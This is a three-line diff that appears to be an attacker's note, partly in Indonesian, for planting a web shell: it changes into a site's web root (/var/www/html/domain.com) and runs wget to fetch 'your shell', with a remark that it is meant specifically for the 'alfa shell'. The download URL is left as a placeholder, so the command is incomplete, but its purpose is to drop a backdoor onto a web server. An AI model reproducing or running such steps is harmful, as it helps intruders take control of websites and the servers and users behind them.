@@ -1,0 +1,3 @@
+PART/Cwd "Folder": cd /var/www/html/domain.com;wget shell mu
+
+Khusus alfa shell
